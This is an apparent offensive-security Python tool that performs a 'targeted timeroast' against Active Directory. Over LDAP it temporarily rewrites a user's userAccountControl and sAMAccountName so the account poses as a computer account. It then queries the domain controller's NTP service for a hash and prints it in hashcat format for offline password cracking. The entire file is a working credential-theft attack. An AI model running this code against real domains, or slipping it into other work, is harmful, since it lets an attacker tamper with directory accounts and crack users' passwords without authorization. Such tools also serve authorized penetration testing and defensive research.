import logging
import struct
import socket
from ldap3 import MODIFY_REPLACE
import time
from struct import pack, unpack
from select import select

class TargetedTimeroast:
    def __init__(self, conn, target=None, verbose=False):
        self.conn = conn
        self.target = target
        self.verbose = verbose

        # Configure logging level
        if self.verbose:
            logging.basicConfig(level=logging.DEBUG)
        else:
            logging.basicConfig(level=logging.INFO)

        # Create logger object
        self.logger = logging.getLogger(__name__)

        self.timeroast(target)
        
    def timeroast(self, target):
        self.users = self.parse_target(target)
        if self.users:
            for user in self.users:
                if user['rid'] not in ['501', '502']:
                    self.attack(user)

        else:
            self.logger.error(f"[!] Target {target} not found")
    
    def get_uac(self, user):
        self.conn.search(
            search_base=self.conn.server.info.other['defaultNamingContext'],
            search_filter=f'(&(objectCategory=person)(objectClass=user)(sAMAccountName={user}))',
            attributes=['userAccountControl']
        )
        self.logger.debug(f"UAC for {user}: {self.conn.entries[0]['userAccountControl'].value}")
        return self.conn.entries[0]['userAccountControl'].value
    

    def set_uac(self, user, uac):
        try:
            # Form correct DN
            search_base = self.conn.server.info.other['defaultNamingContext'][0]
            self.conn.search(
                search_base=search_base,
                search_filter=f'(sAMAccountName={user["samaccountname"]})',
                attributes=['distinguishedName']
            )
            
            if len(self.conn.entries) == 0:
                self.logger.error(f"[!] User {user['samaccountname']} not found in directory")
                return
            
            user_dn = self.conn.entries[0]['distinguishedName'].value
            changes = {
                'userAccountControl': [(MODIFY_REPLACE, [uac])]
            }
            self.conn.modify(user_dn, changes)
            
            # Add debug information
            if self.conn.result['description'] == 'success':
                self.logger.debug(f"UAC for {user['samaccountname']} set to {uac}")
            else:
                self.logger.error(f"[!] Failed to modify UAC for {user['samaccountname']}: {self.conn.result['description']}")
                self.logger.error(f"Details: {self.conn.result}")
                
        except Exception as e:
            self.logger.error(f"[!] Error modifying UAC for {user}: {str(e)}")
            return None

    def modify_samaccountname(self, user, new_user):
        try:
            # Form correct DN
            search_base = self.conn.server.info.other['defaultNamingContext'][0]
            self.conn.search(
                search_base=search_base,
                search_filter=f'(sAMAccountName={user})',
                attributes=['distinguishedName']
            )
            
            if len(self.conn.entries) == 0:
                self.logger.error(f"[!] User {user} not found in directory")
                return
            
            user_dn = self.conn.entries[0]['distinguishedName'].value
            changes = {
                'sAMAccountName': [(MODIFY_REPLACE, [new_user])]
            }
            self.conn.modify(user_dn, changes)
            
            # Add debug information
            if self.conn.result['description'] == 'success':
                self.logger.debug(f"sAMAccountName for {user} changed to {new_user}")
            else:
                self.logger.error(f"[!] Failed to modify sAMAccountName for {user}: {self.conn.result['description']}")
                self.logger.error(f"Details: {self.conn.result}")
                
        except Exception as e:
            self.logger.error(f"[!] Error modifying sAMAccountName for {user}: {str(e)}")
            return None

    def parse_target(self, target):
        if target is None:
            # Get all users in domain
            self.conn.search(
                search_base=self.conn.server.info.other['defaultNamingContext'],
                search_filter='(&(objectCategory=person)(objectClass=user))',
                attributes=['sAMAccountName', 'objectSid']
            )
            return [{'rid': entry['objectSid'].value.split('-')[-1], 
                    'samaccountname': entry['sAMAccountName'].value} 
                    for entry in self.conn.entries]
            
        # Try to find user first
        self.conn.search(
            search_base=self.conn.server.info.other['defaultNamingContext'],
            search_filter=f'(&(objectCategory=person)(objectClass=user)(sAMAccountName={target}))',
            attributes=['sAMAccountName', 'objectSid']
        )
        
        if len(self.conn.entries) > 0:
            return [{'rid': self.conn.entries[0]['objectSid'].value.split('-')[-1],
                    'samaccountname': self.conn.entries[0]['sAMAccountName'].value}]
            
        # If user not found, try to find group
        self.conn.search(
            search_base=self.conn.server.info.other['defaultNamingContext'], 
            search_filter=f'(&(objectClass=group)(sAMAccountName={target}))',
            attributes=['distinguishedName']
        )
        
        if len(self.conn.entries) == 0:
            return None
            
        group_dn = self.conn.entries[0]['distinguishedName'].value
        
        # Get all users from group recursively
        self.conn.search(
            search_base=self.conn.server.info.other['defaultNamingContext'],
            search_filter=f'(&(objectCategory=person)(objectClass=user)(memberOf:1.2.840.113556.1.4.1941:={group_dn}))',
            attributes=['sAMAccountName', 'objectSid']
        )
        
        return [{'rid': entry['objectSid'].value.split('-')[-1],
                'samaccountname': entry['sAMAccountName'].value} 
                for entry in self.conn.entries]
    
    def hashcat_format(self, answer_rid, md5hash, salt):
        return f'{answer_rid}:$sntp-ms${md5hash.hex()}${salt.hex()}'

    def attack(self, user):
        domain_controller = self.conn.server.host
        NEW_UAC = 4096
        NEW_User = user['samaccountname']+'$'
        target_rid = user['rid']
        target_name = user['samaccountname']

        old_uac = self.get_uac(target_name)
        self.set_uac(user, NEW_UAC) 
        self.modify_samaccountname(target_name, NEW_User)
        hashcat_hash = self.timeroast_target(domain_controller, 
                                                 int(target_rid), 
                                                 NEW_User)
        self.modify_samaccountname(NEW_User, target_name)
        self.set_uac(user, old_uac)
        
        print(hashcat_hash)

    def timeroast_target(self, domain_controller, target_rid, target_name):
        self.logger.debug(f"Domain controller: {domain_controller}, target rid: {target_rid}, target name: {target_name}")

        
        NTP_PREFIX = bytes([
        0xdb, 0x00, 0x11, 0xe9, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0xe1, 0xb8, 0x40, 0x7d, 0xeb, 0xc7, 0xe5, 0x06,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0xe1, 0xb8, 0x42, 0x8b, 0xff, 0xbf, 0xcd, 0x0a
        ])
        
        keyflag = 2**31

        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
            try:
                sock.bind(('0.0.0.0', 0))
            except PermissionError:
                raise PermissionError(f'No permission to listen on port 0. May need to run as root.')
        
            query_interval = 1 / 100
            last_ok_time = time.time()

            while time.time() < last_ok_time + 24:
      
                # Send out query for the next RID, if any.
                query_rid = target_rid
                query = NTP_PREFIX + pack('<I', query_rid ^ keyflag) + b'\x00' * 16
                sock.sendto(query, (domain_controller, 123))

                # Wait for either a response or time to send the next query.
                ready, [], [] = select([sock], [], [], query_interval)
                if ready:
                    reply = sock.recvfrom(120)[0]

                    # Extract RID, hash and "salt" if succesful.
                    if len(reply) == 68:
                        salt = reply[:48]
                        answer_rid = unpack('<I', reply[-20:-16])[0] ^ keyflag
                        md5hash = reply[-16:]

                        return self.hashcat_format(answer_rid, md5hash, salt)
